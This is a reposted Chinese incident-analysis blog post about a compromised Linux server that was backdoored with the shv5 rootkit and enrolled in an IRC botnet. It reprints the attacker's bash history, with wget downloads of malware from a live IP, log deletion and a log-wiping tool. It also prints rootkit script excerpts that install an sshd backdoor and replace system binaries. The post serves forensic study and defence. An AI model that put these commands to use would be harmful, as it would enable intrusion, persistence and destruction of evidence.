
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 93 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">一次服务器被入侵后的分析</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">一次服务器被入侵后的分析</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<ul>
<li><a href="http://www.freebuf.com/" target="_blank">首页</a></li>
<li><a href="http://www.freebuf.com/category/news" target="_blank">资讯</a></li>
<li><a href="http://www.freebuf.com/category/tools" target="_blank">工具</a></li>
<li><p><a href="http://www.freebuf.com/category/articles" target="_blank">文章</a></p>
</li>
<li><p><a href="http://www.freebuf.com/category/articles/web" target="_blank">WEB安全</a></p>
</li>
<li><a href="http://www.freebuf.com/category/articles/wireless" target="_blank">无线安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/system" target="_blank">系统安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/database" target="_blank">数据库安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/terminal" target="_blank">终端安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/others-articles" target="_blank">其他</a></li>
<li><a href="http://www.freebuf.com/category/video" target="_blank">视频</a></li>
<li><a href="http://www.freebuf.com/category/jobs" target="_blank">招聘</a></li>
<li><a href="http://www.freebuf.com/category/geek" target="_blank">极客</a></li>
<li><a href="http://www.freebuf.com/bufer" target="_blank">达人</a></li>
<li><a href="http://www.freebuf.com/newsend" target="_blank">投稿</a></li>
</ul>
<p><a href="http://www.freebuf.com/wp-login.php?redirect_to=http://www.freebuf.com" title="登陆" target="_blank">登陆</a><a href="http://www.freebuf.com/wp-login.php?action=register" target="_blank">注册</a></p>
<p><a href="http://www.freebuf.com/" target="_blank"><img src="" alt="freebuf"></a></p>
<p><a href="http://www.weibo.com/freebuf" title="收听新浪微博" target="_blank">新浪微博</a> <a href="http://t.qq.com/freebuf" title="收听腾讯微博" target="_blank">腾讯微博</a><a href="http://www.freebuf.com/feed" title="订阅我们" target="_blank">订阅我们</a></p>
<h3 id="-">一次服务器被入侵后的分析</h3>
<p><a href=""></a><a href="http://www.freebuf.com/author/litdg" title="由 litdg 发布">litdg</a> @ <a href="http://www.freebuf.com/category/articles/system" title="查看 系统安全 中的全部文章" target="_blank">系统安全</a> 2013-09-11 共 <strong>9902</strong> 人围观 </p>
<p><strong>最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.</strong></p>
<p>登上服务器之后随便看了下,最先引起我注意的是”ls”命令的输出:</p>
<p>lars@server1:~$ ls ls: invalid option -- h Try `ls --help&#39; for more information.</p>
<p>为什么”ls”默认加了”-h”参数呢?我用”alias”命令看了一下,然后取消了这个别名之后”ls”就工作正常了.</p>
<p>lars@server1:~$ alias ls alias ls=&#39;ls -sh --color=auto&#39; lars@server1:~$ unalias ls lars@server1:~$ ls backup lars@server1:~$</p>
<p>虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.</p>
<p>lars@server1:~$ sudo /etc/init.d/apache2 start Password: /* Starting apache 2.0 web server... (2): apache2: could not open error log file /var/log/apache2/error.log. Unable to open logs ...fail!</p>
<p>纳尼?赶紧去”/var/log/”目录一看,果然”apache2/”文件夹不见了.而且这个目录下其他的文件夹,比如”mysql/”,”samba/”也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.</p>
<p>lars@server1:~$ sudo -i Password: root@server1:~/# ls ls: unrecognized prefix: do ls: unparsable value for LS_COLORS environment variable total 44 4 . 4 .bashrc 4 .ssh 4 .. 4 .lesshst 8 .viminfo 8 .bash_history 4 .profile 4 .vimrc</p>
<p>很不幸的发现,”ls”又出问题了.同样,用”alias”命令:</p>
<p>root@server1:~/# alias ls alias ls=&#39;ls -sa --color=auto&#39; root@server1:~/# unalias ls root@server1:~/# ls root@server1:~/#</p>
<p>这个时候,我才意识到问题的严重性.”ls”奇怪的举动和”/var/log/”大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的”.bash_history”时,就已经可以确定被入侵了.</p>
<p>root@server1:~/# cat -n .bash_history ... 340 w 341 cd /var 342 wget <a href="http://83.19.148.250/~matys/pliki/shv5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/shv5.tar.gz</a> 343 tar -zxf shv5.tar.gz 344 rm -rf shv5.tar.gz 345 mv shv5 .x 346 cd .x 347 ./setup zibi.joe.149 54098 348 passwd 349 passwd 350 ps aux 351 crontab -l 352 cat /etc/issue 353 cat /etc/passwd 354 w 355 who 356 cd /usr/lib/libsh 357 ls 358 hide + 359 chmod +x hide 360 hide + 361 ./hide + 362 cd /var/.x 363 mkdir psotnic 364 cd psotnic 365 wget <a href="http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz</a> 366 tar -zxf psotnic0.2.5.tar.gz 367 rm -rf psotnic0.2.5.tar.gz 368 ls 369 mv psotnic-0.2.5-linux-static-ipv6 synscan 370 ./synscan 371 vi conf 372 vi conf1 373 mv synscan smbd 374 smbd -c conf 375 ls 376 ps aux 377 ls 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1 383 rm -rf conf.dec 384 rm -rf conf1.dec 385 cd /usr/lib/libsh 386 ./hide + 387 exit ... 425 ssh ftp@62.101.251.166 426 w 427 ls 428 ls 429 cd /var/.x 430 ls 431 cd psotnic/ 432 ls 433 rm -rf /var/log//* 434 exit 435 ls 436 cd /var/.x/psotnic/ 437 ls 438 vi conf2 439 ./smbd -c conf2 440 ./smbd conf2 441 ./smbd -a conf conf1 conf2 442 rm -rf conf2.dec 443 cd .. 444 ls 445 cd /usr/lib/libsh 446 hide + 447 ./hide + 448 exit 449 ps aux 450 cd /var/.x 451 ls 452 ls 453 cd psotnic/ 454 ls 455 cat pid.MastaH 456 kill -9 2030 457 ./synscan -a conf conf1 458 ./smbd -a conf conf1 459 cd /usr/lib/libsh 460 ./hide +</p>
<p>Woht!这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除”.bash_history”文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵.</p>
<p>通过bash history我们得到了大量的信息.先来看一下”/var/.x”下面隐藏了什么和命令”setup zibi.joe.149 54098″的作用吧.</p>
<p>root@server1:/var/.x/# file setup setup: Bourne-Again shell script text executable root@server1:/var/.x/# wc -l setup 825 setup root@server1:/var/.x/# head -17 setup /#!/bin/bash /# /# shv5-internal-release /# by: PinT[x] April/2003 /# /# greetz to: /# /# [/<em>] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99 /# C00L|0, GolDenLord, Spike, zion ... /# [/</em>] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ... /# [/<em>] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ... /# [/</em>] tC-members: eksol, termid, hex, keyhook, maher, tripod etc.. /# [/<em>] And all others who diserve to be here but i forgot /# [/</em>] them at the moment ! /# /# PRIVATE ! DO NOT DISTRIBUTE /<em>censored/</em>EZ !</p>
<p>“setup”这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门–”/bin/ttyload”,然后把它加到了”/etc/inittab”,这样每次重启后就会自动启动.(相关部分的脚本如下:)</p>
<p>mv $SSHDIR/sshd /sbin/ttyload chmod a+xr /sbin/ttyload chmod o-w /sbin/ttyload touch -acmr /bin/ls /sbin/ttyload chattr +isa /sbin/ttyload kill -9 <code>pidof ttyload</code> &gt;/dev/null 2&gt;&amp;1 .... /# INITTAB SHUFFLING chattr -isa /etc/inittab cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1 cat /etc/inittab |grep getty &gt; /tmp/.init2 echo &quot;/# Loading standard ttys&quot; &gt;&gt; /tmp/.init1 echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p>
<p>它也替换了一些linux的标准命令.</p>
<p>/# Backdoor ps/top/du/ls/netstat/etc.. cd $BASEDIR/bin BACKUP=/usr/lib/libsh/.backup mkdir $BACKUP ... /# ls ... chattr -isa /bin/ls cp /bin/ls $BACKUP mv -f ls /bin/ls chattr +isa /bin/ls</p>
<p>这样子就可以解释为什么”ls”命令输出那么奇怪了.</p>
<p>“.backup”文件夹保存了被替换之前的命令程序.</p>
<p>root@server1:/var/.x/# ls -l /usr/lib/libsh/.backup/ total 552 -rwxr-xr-x 1 root root 126276 Dec 24 22:58 find -rwxr-xr-x 1 root root 59012 Dec 24 22:58 ifconfig -rwxr-xr-x 1 root root 77832 Dec 24 22:58 ls -rwxr-xr-x 1 root root 30388 Dec 24 22:58 md5sum -rwxr-xr-x 1 root root 99456 Dec 24 22:58 netstat -rwxr-xr-x 1 root root 65492 Dec 24 22:58 ps -rwxr-xr-x 1 root root 14016 Dec 24 22:58 pstree -rwxr-xr-x 1 root root 50180 Dec 24 22:58 top</p>
<p>看了一下时间戳,居然是在圣诞节.</p>
<p>很显然,原始的”ls”和后门安装的”ls”是不一样的.他们的md5对比如下:
root@server1:~/# md5sum /usr/lib/libsh/.backup/ls /bin/ls eef7ca9dd6be1cc53bac84012f8d1675 /usr/lib/libsh/.backup/ls 0a07cf554c1a74ad974416f60916b78d /bin/ls root@server1:~/# file /bin/ls /bin/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked (uses shared libs), for GNU/Linux 2.0.0, stripped root@server1:~/# file /usr/lib/libsh/.backup/ls /usr/lib/libsh/.backup/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.0, dynamically linked (uses shared libs), for GNU/Linux 2.6.0, stripped</p>
<p>这个rootkit(“sh5.tar.gz”)是从下面的地址下载的.</p>
<p>root@server1:~/# dig +short -x 83.19.148.250 4lo.bydg.pl.</p>
<p>这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.</p>
<p>这是运行”setup”命令的截图:(在服务器上的沙盒里运行的)</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030843_30626.jpg" alt=""></p>
<p>所以”zibi.joe.149″是后门的密码,”54098″是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130910/20130910030856_44197.jpg" alt=""></p>
<p>安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.”psotnic0.2.5.tar.gz”就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为”smbd”,来达到隐藏的目的.</p>
<p>然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了.</p>
<p>371 vi conf 372 vi conf1 .... 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1</p>
<p>让我们执行一下382这条命令,看看会发生什么.
root@server1:/var/.x/psotnic/# ./smbd -a conf conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [+] Adding: /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 [+] Adding: /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1 [+] Added 2 psotnics to cron</p>
<p>哇!它添加了cron定时任务.赶紧看一看:</p>
<p>root@server1:/var/.x/psotnic/# crontab -l /<em>/10 /</em> /<em> /</em> /<em> cd /var/.x/psotnic; ./smbd conf &gt;/dev/null 2&gt;&amp;1 /</em>/10 /<em> /</em> /<em> /</em> cd /var/.x/psotnic; ./smbd conf1 &gt;/dev/null 2&gt;&amp;1</p>
<p>接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程:
root@server1:~/# cd /var/.x/psotnic; ./smbd conf Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/<em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5724] root@server1:/var/.x/psotnic/# ./smbd conf1 Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49) Copyright (C) 2003-2005 Grzegorz Rusin [/</em>] Acting as LEAF [+] Config loaded [+] Going into background [pid: 5727] root@server1:/var/.x/psotnic/#</p>
<p>用”ps”命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程.</p>
<p>root@server1:/var/.x/psotnic/# ps axuw | grep smb root 3799 0.0 0.4 8592 2156 ? S 11:00 0:00 /usr/sbin/smbd -D root 3808 0.0 0.1 8592 896 ? S 11:00 0:00 /usr/sbin/smbd -D root 5724 0.0 0.1 1648 772 pts/2 S 12:47 0:00 ./smbd conf root 5727 0.0 0.1 1640 764 pts/2 S 12:47 0:00 ./smbd conf1</p>
<p>最开始两个是真正的samba进程,后面两个是irc-bot,让我们用”strace”命令来看看它做了什么:
root@server1:~/# strace -p 5727 ... connect(3, {sa_family=AF_INET, sin_port=htons(9714), sin_addr=inet_addr(&quot;83.18.74.235&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress) ... connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr(&quot;195.159.0.92&quot;)}, 16) = -1 EINPROGRESS (Operation now in progress)</p>
<p>可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口:</p>
<p>root@server1:~/# dig +short -x 83.18.74.235 manhattan.na.pl. root@server1:~/# dig +short -x 195.159.0.92 ircnet.irc.powertech.no.</p>
<p>又是一个波兰的ip.另外一个ip,”ircnet.irc.powertech.no”是”irc.powertech.nof”的别名.是挪威一个著名的irc服务器.</p>
<p>tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了”irc.powertech.no”,加入了”/#aik”频道.
:irc.powertech.no 001 578PAB9NB :Welcome to the Internet Relay Network 578PAB9NB!~op@ti231210a080-3666.bb.online.no :irc.powertech.no 002 578PAB9NB :Your host is irc.powertech.no, running version 2.11.1p1 :578PAB9NB!~op@ti231210a080-3666.bb.online.no JOIN :/#aik :irc.powertech.no 353 578PAB9NB @ /#aik :578PAB9NB kknd raider brandyz jpi conf xerkoz IpaL vvo :irc.powertech.no 366 578PAB9NB /#aik :End of NAMES list. :irc.powertech.no 352 578PAB9NB /#aik ~op ti231210a080-3666.bb.online.no irc.powertech.no 578PAB9NB G :0 op - GTW :irc.powertech.no 352 578PAB9NB /#aik ~kknd ti231210a080-3666.bb.online.no irc.hitos.no kknd H :2 kknd - GTW :irc.powertech.no 352 578PAB9NB /#aik ~raider mobitech-70.max-bc.spb.ru /<em>.dotsrc.org raider G :4 raider - GTW :irc.powertech.no 352 578PAB9NB /#aik ~brandyz mobitech-70.max-bc.spb.ru /</em>.dotsrc.org brandyz G :4 brandyz - GTW :irc.powertech.no 352 578PAB9NB /#aik ~jpi p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp jpi G :8 jpi - GTW :irc.powertech.no 352 578PAB9NB /#aik ~conf p3124-ipad309sasajima.aichi.ocn.ne.jp /</em>.jp conf G :7 conf - GTW :irc.powertech.no 352 578PAB9NB /#aik ~xerkoz p3124-ipad309sasajima.aichi.ocn.ne.jp /<em>.jp xerkoz H :7 xerkoz - GTW :irc.powertech.no 352 578PAB9NB /#aik lm campus19.panorama.sth.ac.at /</em>.at IpaL H :5 .LaPi.9@.IRCNet.. :irc.powertech.no 352 578PAB9NB /#aik ~vvo ppp86-7.intelcom.sm /*.tiscali.it vvo H :6 vvo - GTW :irc.powertech.no 315 578PAB9NB /#aik :End of WHO list. 这些仅仅是加入/#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了. 17:43 -!- viper42 [~viper42@trinity.gnist.org] has joined /#aik 17:43 [Users /#aik] 17:43 [ 578PAB9NL] [ conf] [ jpi ] [ raider ] [ vvo ] 17:43 [ brandyz ] [ IpaL] [ kknd] [ viper42] [ xerkoz] 17:43 -!- Irssi: /#aik: Total of 10 nicks [0 ops, 0 halfops, 0 voices, 10 normal] 17:43 -!- Irssi: Join to /#aik was synced in 1 secs</p>
<p>我发现我朋友的服务器使用的昵称是”578PQB9NB”,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀”\/*-GTW”,只有一个没有:</p>
<p>17:45 [powertech] -!- IpaL [lm@campus19.panorama.sth.ac.at] 17:45 [powertech] -!- ircname : LaPi@IRCNet 17:45 [powertech] -!- channels : /#relaks /#ping @/#seks /#aik @/#ogame.pl /#pingwinaria /#hattrick /#trade /#admin @/#!sh 17:45 [powertech] -!- server : /*.at [\o\ \o/ /o/]</p>
<p>这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了:</p>
<p>$ dig +short campus19.panorama.sth.ac.at 193.170.51.84</p>
<p>根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:
From: Alexander Talos via RT To: larstra@ifi.uio.no Subject: Cracker at campus19.panorama.sth.ac.at (193.170.51.84) [ACOnet CERT /#38603] Date: Fri, 18 May 2007 18:22:43 +0200 (CEST) Reply-To: cert@aco.net -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 Hej! On Fri May 18 14:45:03 2007, larstra@ifi.uio.no wrote: &gt; I have been tracking down cracker which connected from &gt; campus19.panorama.sth.ac.at (193.170.51.84). The user, which Ouch. panorama.sth.ac.at is a dormitory with about 4k rooms all behind a NAT gateway - it will be very hard to get hold of the miscreant. This incident will, in the long run, definitely help me getting rid of the NAT boxes in setups like that, but right now, we will have to make do with what we have. &gt; Please investigate the host in question. Perhaps is this a &gt; compromised host on your network acting as a jumpstation for Sure, and even in a NATed environment, this is still possible. Btw, you did a great job in analysing the compromised machine! I&#39;ll let you know when I have either further questions or any interesting results. Cheers, Alexander Talos - -- IT-Security, Universitaet Wien, ACOnet CERT T: +43-1-4277-14351 M: +43-664-60277-14351</p>
<p>看起来我不够幸运.</p>
<p>接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口.</p>
<p>连接到”83.18.74.235″的流量看起来很混乱.只好再次用strace命令:</p>
<p>root@server1:/var/.x/psotnic/# strace -f ./smbd conf1 &amp;&gt; /root/dump.strace</p>
<p>跟预期的一样,有很多输出,其中一个是它尝试启动”BitchX”,这是一个irc客户端.但是失败了,因为BitchX没有安装:</p>
<p>[pid 7537] write(2, &quot;sh: &quot;, 4) = 4 [pid 7537] write(2, &quot;BitchX: not found&quot;, 17) = 17 [pid 7537] write(2, &quot;n&quot;, 1) = 1 [pid 7537] close(2) = 0</p>
<p>下面的截图是tcpdump抓到流量的一部分:</p>
<p><img src="http://static.freebuf.com/uploads/image/20130911/20130911000637_34187.jpg" alt=""></p>
<p>这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是”irc.hitos.no”,位于挪威的特罗姆斯郡.</p>
<p>入侵者除了这些,还运行了一个叫”hide”的脚本来清除日志:
root@server1:/usr/lib/libsh/# ./hide + Linux Hider v2.0 by mave enhanced by me! [+] [Shkupi Logcleaner] Removing + from the logs........ . [+] /var/log/messages ... [done] [+] /var/run/utmp ... [done] [+] /var/log/lastlog ... [done] [+] /var/log/wtmp ... [done] /<em> m i s s i o n a c c o m p l i s h e d /</em> p.h.e.e.r S.H.c.r.e.w</p>
<p>那么这个入侵者为什么还要把”/var/log/”目录全删除了呢,是不相信这个工具么?还是他特别害怕?</p>
<p>可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到:</p>
<p>1, 忘记清除”.bash_history”文件</p>
<p>2, “/var/log”目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.</p>
<p>3, 修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.</p>
<p>4, irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.</p>
<p>5, 入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.</p>
<p>当然还有几个遗留的问题:</p>
<p>1,”ssh ftp@62.101.251.166″ 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?</p>
<p>$ dig +short -x 62.101.251.166 cA6FB653E.dhcp.bluecom.no.</p>
<p>2,跟83.18.74.235(manhattan.na.pl)的通讯内容是什么?</p>
<p>3,最重要的问题是他一开始是如何或得下系统的权限的?这个服务器运行的是Ubuntu 6.06 LTS,打了最新的补丁.可能入侵的途径:</p>
<p>/<em>猜测root密码,不幸的是这个密码是强密码/</em></p>
<p>/<em>未知的exploit/</em></p>
<p>/<em>某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码./</em></p>
<p><a href="http://blog.larsstrand.no/2007/04/holiday-cracking.html" target="_blank">原文地址</a>
9 1 您已评价！</p>
<h3 id="-freebuf-com-http-www-freebuf-com-"><img src="" alt=""> <strong>如文中未特别声明转载请注明出自:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h3>
<p><img src="" alt=""> <a href="&quot;累计分享3次&quot;">3</a>
<img src="&quot;Favorite&quot;" alt="Favorite"><img src="&quot;Loading&quot;" alt="Loading"><a href="http://www.freebuf.com/articles/system/?wpfpaction=add&amp;postid=12443" title="收藏该文" target="_blank">收藏该文</a></p>
<h3 id="-">相关文章</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12696.html" target="_blank">Dionaea低交互式蜜罐部署详解</a></li>
</ul>
<p><strong>4</strong>条评论 <strong>3638</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12443.html" target="_blank">一次服务器被入侵后的分析</a></li>
</ul>
<p><strong>24</strong>条评论 <strong>9904</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank">Socks代理反弹突破内网</a></li>
</ul>
<p><strong>15</strong>条评论 <strong>6114</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12140.html" target="_blank">如何导出Windows哈希系列二</a></li>
</ul>
<p><strong>7</strong>条评论 <strong>3940</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12104.html" target="_blank">浅谈企业运维安全</a></li>
</ul>
<p><strong>21</strong>条评论 <strong>6140</strong>人已围观
﻿</p>
<h2 id="24-comments-">24 Comments <a href="">发表评论</a></h2>
<ol>
<li><a href="http://www.freebuf.com/?author=3022" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/园长MM" target="_blank">园长MM </a> (1级)  <a href=""></a> 2013-09-11    1楼</li>
</ol>
<p>路过
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15570#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=1804" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/whitemonty" target="_blank">whitemonty </a> (1级)  <a href=""></a> 2013-09-11    2楼</li>
</ol>
<p>欢迎收看黑客追踪第一季
<a href="">亮了</a>(5)
<a href="http://www.freebuf.com/articles/system/?replytocom=15572#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11    3楼</li>
</ol>
<p>一个普通的web蠕虫+IRC木马 而已。
据老衲的经验 十之八九 是 IRC木马 自动攻击了你朋友的web服务器，通过蠕虫的web漏洞攻击插件，获得了权限，提权，下载安装木马，然后你朋友服务器就成了这僵尸网络中一个普普通通的 肉鸡。</p>
<p>文中提及的诸多入侵者的纰漏都是因为 自动脚本完成的，所以没那么精致。
<a href="">亮了</a>(10)
